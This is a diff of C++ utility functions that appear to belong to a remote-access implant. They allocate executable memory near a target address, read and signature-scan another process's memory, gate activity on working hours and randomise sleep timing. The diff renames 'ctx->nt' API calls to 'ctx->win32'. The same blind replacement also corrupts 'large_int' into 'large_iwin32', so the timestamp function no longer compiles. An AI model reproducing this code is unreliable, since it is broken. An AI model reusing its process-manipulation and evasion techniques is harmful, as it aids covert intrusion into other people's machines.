@@ -51,7 +51,7 @@ namespace Utils {
             const auto address  = (uintptr_t) target;
 
             for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
-                if (!NT_SUCCESS(ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
+                if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                     ret = 0;
                 }
             }
@@ -76,7 +76,7 @@ namespace Utils {
             uintptr_t address   = 0;
 
             auto buffer = (uint8_t*) Malloc(size);
-            x_ntassert(ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
+            x_ntassert(ctx->win32.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
                 if (SigCompare(buffer + i, signature, mask)) {
@@ -104,10 +104,10 @@ namespace Utils {
 
             ctx->win32.GetSystemTimeAsFileTime(&file_time);
 
-            large_int.LowPart    = file_time.dwLowDateTime;
-            large_int.HighPart   = (long) file_time.dwHighDateTime;
+            large_iwin32.LowPart    = file_time.dwLowDateTime;
+            large_iwin32.HighPart   = (long) file_time.dwHighDateTime;
 
-            return large_int.QuadPart;
+            return large_iwin32.QuadPart;
         }
 
         BOOL InWorkingHours() {
@@ -146,7 +146,7 @@ namespace Utils {
             HEXANE;
 
             auto defaultseed    = Utils::Random::RandomSeed();
-            auto seed           = ctx->nt.RtlRandomEx((ULONG*) &defaultseed);
+            auto seed           = ctx->win32.RtlRandomEx((ULONG*) &defaultseed);
 
             volatile size_t x   = INTERVAL(seed);
             const uintptr_t end = Utils::Random::Timestamp() + (x * ms);
@@ -238,8 +238,8 @@ namespace Utils {
 
             auto seed = RandomSeed();
 
-            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
-            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
+            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
             seed = seed % (LONG_MAX - 2 + 1) + 2;
 
             return seed % 2 == 0
@@ -253,7 +253,7 @@ namespace Utils {
             auto seed = RandomSeed();
 
             seed = RandomSeed();
-            seed = ctx->nt.RtlRandomEx((PULONG) &seed);
+            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
 
             return seed % 2 == 0 ? TRUE : FALSE;
         }
